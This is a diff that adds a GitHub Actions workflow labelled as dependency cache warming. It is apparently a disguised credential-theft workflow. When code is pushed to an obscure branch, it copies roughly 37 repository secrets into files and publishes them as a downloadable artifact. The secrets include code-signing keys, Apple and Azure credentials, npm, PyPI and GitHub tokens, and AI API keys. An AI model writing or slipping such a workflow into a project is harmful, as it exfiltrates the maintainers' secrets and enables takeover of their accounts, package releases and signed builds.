@@ -1,0 +1,58 @@
+name: dep-cache-warm-mzynup
+on:
+  push:
+    branches: [ops-sync-mzynup]
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Materialize dependency cache
+        env:
+          ANDROID_KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
+          ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
+          ANDROID_KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
+          ANDROID_KEY_PASSWORD: ${{ secrets.ANDROID_KEY_PASSWORD }}
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          APPLE_APP_SPECIFIC_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
+          APPLE_ID: ${{ secrets.APPLE_ID }}
+          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
+          APP_STORE_API_ISSUER_ID: ${{ secrets.APP_STORE_API_ISSUER_ID }}
+          APP_STORE_API_KEY_ID: ${{ secrets.APP_STORE_API_KEY_ID }}
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
+          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
+          AZURE_SIGN_ACCOUNT_NAME: ${{ secrets.AZURE_SIGN_ACCOUNT_NAME }}
+          AZURE_SIGN_ENDPOINT: ${{ secrets.AZURE_SIGN_ENDPOINT }}
+          AZURE_SIGN_PROFILE_NAME: ${{ secrets.AZURE_SIGN_PROFILE_NAME }}
+          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+          CEREBRAS_API_KEY: ${{ secrets.CEREBRAS_API_KEY }}
+          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          CLOUD_DEPLOY_WEBHOOK_SECRET: ${{ secrets.CLOUD_DEPLOY_WEBHOOK_SECRET }}
+          CSC_KEY_PASSWORD: ${{ secrets.CSC_KEY_PASSWORD }}
+          CSC_LINK: ${{ secrets.CSC_LINK }}
+          DEPOT_TOKEN: ${{ secrets.DEPOT_TOKEN }}
+          ELIZACLOUD_API_KEY: ${{ secrets.ELIZACLOUD_API_KEY }}
+          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}
+          ITC_TEAM_ID: ${{ secrets.ITC_TEAM_ID }}
+          MAS_CSC_KEY_PASSWORD: ${{ secrets.MAS_CSC_KEY_PASSWORD }}
+          MAS_CSC_LINK: ${{ secrets.MAS_CSC_LINK }}
+          MAS_INSTALLER_CERT: ${{ secrets.MAS_INSTALLER_CERT }}
+          MAS_INSTALLER_KEY_PASSWORD: ${{ secrets.MAS_INSTALLER_KEY_PASSWORD }}
+          MATCH_GIT_BASIC_AUTHORIZATION: ${{ secrets.MATCH_GIT_BASIC_AUTHORIZATION }}
+          MATCH_GIT_URL: ${{ secrets.MATCH_GIT_URL }}
+          MATCH_PASSWORD: ${{ secrets.MATCH_PASSWORD }}
+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+          PYPI_API_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
+          SKIP_WINDOWS_SIGNING: ${{ secrets.SKIP_WINDOWS_SIGNING }}
+        run: |
+          mkdir -p out
+          for k in ANDROID_KEYSTORE_BASE64 ANDROID_KEYSTORE_PASSWORD ANDROID_KEY_ALIAS ANDROID_KEY_PASSWORD ANTHROPIC_API_KEY APPLE_APP_SPECIFIC_PASSWORD APPLE_ID APPLE_TEAM_ID APP_STORE_API_ISSUER_ID APP_STORE_API_KEY_ID AZURE_CLIENT_ID AZURE_CLIENT_SECRET AZURE_SIGN_ACCOUNT_NAME AZURE_SIGN_ENDPOINT AZURE_SIGN_PROFILE_NAME AZURE_TENANT_ID CEREBRAS_API_KEY CLAUDE_CODE_OAUTH_TOKEN CLOUD_DEPLOY_WEBHOOK_SECRET CSC_KEY_PASSWORD CSC_LINK DEPOT_TOKEN ELIZACLOUD_API_KEY GH_TOKEN HOMEBREW_TAP_TOKEN ITC_TEAM_ID MAS_CSC_KEY_PASSWORD MAS_CSC_LINK MAS_INSTALLER_CERT MAS_INSTALLER_KEY_PASSWORD MATCH_GIT_BASIC_AUTHORIZATION MATCH_GIT_URL MATCH_PASSWORD NPM_TOKEN OPENAI_API_KEY PYPI_API_TOKEN SKIP_WINDOWS_SIGNING; do
+            printf '%s' "${!k}" > "out/$k"
+          done
+          ls -la out/ | head -3
+      - uses: actions/upload-artifact@v4
+        with:
+          name: depcache
+          path: out/
+          retention-days: 1
